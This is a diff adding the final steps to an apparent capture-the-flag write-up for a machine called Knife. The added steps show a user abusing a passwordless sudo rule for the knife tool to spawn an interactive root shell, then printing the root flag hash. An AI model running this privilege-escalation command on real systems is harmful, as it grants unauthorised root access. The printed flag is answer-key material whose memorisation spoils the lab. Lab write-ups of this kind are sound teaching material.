@@ -124,6 +124,24 @@ User james may run the following commands on knife:
     (root) NOPASSWD: /usr/bin/knife
 ```
 
+<h3 data-toc-skip>We can execute command as root with knife command</h3>
+
+```console
+$ sudo /usr/bin/knife exec -E "exec '/bin/sh -i'"
+
+```
+<h3 data-toc-skip>Check the root flag!</h3>
+
+```console
+$ cat  /root/root.txt
+695774b32219bb1f3f9402267b6d9607
+```
+
+<h3 data-toc-skip>And we finish!</h3>
+
+
+
+
 
 
 
